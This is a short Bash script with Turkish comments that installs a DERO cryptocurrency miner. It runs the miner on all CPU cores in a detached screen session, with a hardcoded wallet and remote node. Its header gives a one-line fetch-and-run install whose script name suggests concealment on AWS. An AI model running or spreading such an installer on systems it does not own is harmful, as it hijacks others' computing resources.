
#!/bin/bash
# DERO Miner Kurulum Scripti
# Node: 91.98.80.16:10100
# GitHub: https://github.com/josephderler/miner.sh
#
# Tek Komutla Kurulum:
# bash <(wget -qO- https://raw.githubusercontent.com/josephderler/miner.sh/main/aws_gizleme.sh)

set -e

echo "========================================="
echo "DERO Miner Kurulumu"
echo "========================================="
echo ""

# Gerekli bağımlılıklar
apt-get update -y > /dev/null 2>&1
apt-get install wget screen -y > /dev/null 2>&1

# Miner indir
MINER_DIR="/opt/dero-miner"
mkdir -p $MINER_DIR
cd $MINER_DIR

echo "Miner indiriliyor..."
wget -q https://github.com/deroproject/derohe/releases/latest/download/dero_linux_amd64.tar.gz -O dero.tar.gz
tar -xvzf dero.tar.gz > /dev/null 2>&1
cd dero_linux_amd64

# Miner'ı kopyala
cp dero-miner-linux-amd64 $MINER_DIR/dero-miner
chmod +x $MINER_DIR/dero-miner

echo "Miner hazırlanıyor..."

# Eski process'i kapat
pkill -f dero-miner 2>/dev/null || true
screen -S dero-miner -X quit 2>/dev/null || true

# CPU çekirdek sayısını al
total_cores=$(nproc)
use_cores=$total_cores

echo "Miner başlatılıyor (threads: $use_cores)..."

# Screen ile miner'ı başlat
screen -dmS dero-miner $MINER_DIR/dero-miner \
  --wallet-address dero1qypgrnglnxtv2f2f3uy25ra4a9dq9jpka2s4wv2u0lt5h8rrmrylzqqv2z2lj \
  --daemon-rpc-address 91.98.80.16:10100 \
  --mining-threads $use_cores

sleep 2

# Temizlik
cd /
rm -rf /opt/dero-miner/dero_linux_amd64 2>/dev/null || true
rm -f /opt/dero-miner/dero.tar.gz 2>/dev/null || true

echo ""
echo "✅ Miner kuruldu ve başlatıldı"
echo ""
echo "Miner'ı izlemek için:"
echo "  screen -r dero-miner"
echo ""
echo "Screen'den çıkmak için:"
echo "  Ctrl+A, sonra D tuşuna basın"
echo ""
echo "Screen listesi:"
echo "  screen -ls"
echo ""
echo "Miner durumu:"
screen -ls | grep dero-miner && echo "✅ Miner çalışıyor" || echo "❌ Miner çalışmıyor"
